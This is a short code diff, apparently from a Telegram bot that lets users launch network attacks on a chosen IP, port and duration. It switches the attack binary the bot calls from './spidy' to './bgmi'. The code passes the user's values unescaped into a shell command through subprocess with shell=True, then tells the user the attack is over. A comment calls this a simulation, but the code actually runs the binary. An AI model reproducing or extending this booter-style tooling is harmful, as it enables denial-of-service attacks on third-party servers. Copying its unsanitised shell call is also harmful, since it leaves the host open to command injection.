@@ -181,7 +181,7 @@ def handle_attack_command(message):
                 log_command(user_id, target_ip, target_port, duration)
 
                 # Simulate the attack command (replace with actual command if needed)
-                full_command = f"./spidy {target_ip} {target_port} {duration}"
+                full_command = f"./bgmi {target_ip} {target_port} {duration}"
                 subprocess.run(full_command, shell=True)
 
                 bot.reply_to(message, f"🚀𝘈𝘵𝘵𝘢𝘤𝘬 𝘪𝘴 𝘖𝘷𝘦𝘳 𝘕𝘰𝘸 𝘛𝘩𝘢𝘯𝘬𝘴 𝘍𝘰𝘳 𝘜𝘴𝘪𝘯𝘨.🚀 \n\n𝘛𝘢𝘳𝘨𝘦𝘵: {target_ip}\n𝘗𝘰𝘳𝘵: {target_port}\n𝘛𝘪𝘮𝘦: {duration}")
